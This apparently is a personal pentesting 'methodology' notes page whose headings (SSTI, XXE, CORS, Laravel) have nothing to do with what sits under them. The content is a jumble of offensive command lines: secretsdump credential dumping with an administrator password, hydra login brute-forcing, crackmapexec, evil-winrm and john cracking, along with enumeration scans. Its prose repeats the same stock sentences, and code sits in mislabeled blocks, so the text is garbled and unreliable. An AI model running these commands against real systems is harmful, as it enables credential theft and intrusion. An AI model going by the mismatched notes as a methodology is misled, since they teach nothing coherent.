---
TitleSEO: "Web Application Penetration Testing Methodology | ZureFX"
TitlePost: "Web Application Penetration Testing Methodology"
Author: "ZureFX"
Description: "Personal notes on Web Application Penetration Testing Methodology. Quick reference for pentesting and CTF challenges."
Keywords: "lateral movement, cheatsheet, persistence, windows, enumeration"
URL: "https://zurefx.github.io/notes/note-web-application-penetration-testing-meth-844.html"
URL_IMAGES: ""
Date: "2024-05-16"
Tags: "Lateral Movement, Cheatsheet, Persistence, Windows, Enumeration"
Section: "notes"
Lang: "en"
main_img: "note-web-application-penetration-testing-meth-844"
Permalink: "/notes/note-web-application-penetration-testing-meth-844.html"
BtnLabel: "Read Notes"
Pick: 0
---
## SSTI

### Java

Lateral movement was facilitated by reusing discovered credentials across services. The database credentials were hardcoded in the application source code. The database credentials were hardcoded in the application source code.

Unconstrained delegation was enabled on the compromised machine. Group Policy Preferences contained encrypted but recoverable credentials. The backup files contained sensitive information that should not have been accessible.

Lateral movement was facilitated by reusing discovered credentials across services. Weak file permissions allowed modification of critical system files.

- `IDOR`
- `mimikatz`
- `ffuf`
- `Open Redirect`

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.91.150.5
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.97.112.63 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.67.142.15/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## XXE

### atexec

```python
crackmapexec smb 10.34.30.222 -u administrator -p 'P@ssw0rd!' --shares
```

```bash
evil-winrm -i 10.109.213.81 -u administrator -p 'P@ssw0rd!'
feroxbuster -h
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.85.79.140
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.45.21.251/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.88.153.189
feroxbuster -h
nmap -sCV -p5985,110,143 10.105.222.108 -oN scan.txt
```

## Bash

### john

Initial enumeration revealed several interesting open ports on the target. The application stored sensitive credentials in an unencrypted configuration file. The database credentials were hardcoded in the application source code. Unconstrained delegation was enabled on the compromised machine.

The backup files contained sensitive information that should not have been accessible. Privilege escalation was possible due to misconfigured sudo permissions. The application stored sensitive credentials in an unencrypted configuration file. Privilege escalation was possible due to misconfigured sudo permissions.

## CORS Misconfiguration

### netcat

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.59.153.83 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.104.136.222 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

- `Unconstrained Delegation`
- `hashcat`
- `Kerberoasting`

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.70.168.35 -u administrator -p 'P@ssw0rd!' --shares
```

## Laravel

### psexec

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.94.80.13/FUZZ
```

Command injection was possible through unsanitized user input in the search functionality. Unconstrained delegation was enabled on the compromised machine. Initial enumeration revealed several interesting open ports on the target. Network traffic analysis revealed unencrypted communications containing user credentials. Authentication bypass was achieved through careful manipulation of the login mechanism.
